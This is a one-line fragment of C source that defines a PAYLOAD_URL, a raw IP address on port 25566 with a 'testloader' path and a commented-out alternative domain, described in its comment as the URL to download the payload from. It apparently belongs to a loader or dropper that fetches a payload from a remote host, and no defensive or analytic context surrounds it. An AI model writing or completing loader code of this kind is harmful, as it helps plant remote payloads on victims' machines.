...
#define PAYLOAD_URL "https://71.163.46.151:25566/api/testloader?send=" //"https://fruit.qc.to:25566/api/testloader?send=payload-6" // URL to download the payload from
